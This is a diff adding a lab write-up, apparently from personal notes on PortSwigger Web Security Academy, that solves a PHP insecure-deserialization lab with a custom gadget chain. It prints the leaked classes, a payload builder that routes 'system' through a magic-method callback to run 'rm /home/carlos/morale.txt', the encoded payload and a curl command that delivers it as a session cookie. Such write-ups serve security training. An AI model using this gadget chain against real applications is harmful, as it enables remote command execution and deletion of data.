@@ -8,6 +8,74 @@ ignore_macros: true
 
 ## Insecure deserialization
 
+### Custom gadget chain for PHP deserialization
+
+> Lab: [Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)
+
+**1.** Source code leaks via backup file :
+
+- /cgi-bin/libs/CustomTemplate.php~
+
+```php
+class CustomTemplate {
+    // ...
+
+    public function __wakeup() {
+        $this->build_product();
+    }
+
+    private function build_product() {
+        $this->product = new Product($this->default_desc_type, $this->desc);
+    }
+}
+
+class Product {
+    public $desc;
+
+    public function __construct($default_desc_type, $desc) {
+        $this->desc = $desc->$default_desc_type;
+    }
+}
+
+class DefaultMap {
+    // ...
+
+    public function __get($name) {
+        return call_user_func($this->callback, $name);
+    }
+}
+```
+
+**2.** Create serialization payload
+
+```php
+<?php
+
+class CustomTemplate {}
+class Product {}
+class Description {}
+class DefaultMap {}
+
+$defaultMap = new DefaultMap();
+$defaultMap->callback = "system";
+
+$customTemplate = new CustomTemplate();
+$customTemplate->desc = $defaultMap;
+$customTemplate->default_desc_type = "rm /home/carlos/morale.txt";
+
+echo serialize($customTemplate);
+```
+
+**3.** Execute it via cookie
+
+```bash
+$ php xpl.php
+O:14:"CustomTemplate":2:{s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";}%
+$ php xpl.php | base64 -w0 | sed 's/=/%3D/g'
+TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6NDoiZGVzYyI7TzoxMDoiRGVmYXVsdE1hcCI6MTp7czo4OiJjYWxsYmFjayI7czo2OiJzeXN0ZW0iO31zOjE3OiJkZWZhdWx0X2Rlc2NfdHlwZSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30%3D
+$ curl 'https://0ae800d704396245c019105e00b3005d.web-security-academy.net/' -b "session=$(php xpl.php | base64 -w0 | sed 's/=/%3D/g')"
+```
+
 ### PHAR deserialization & custom gadget chain
 
 > Lab : [Using PHAR deserialization to deploy a custom gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain)
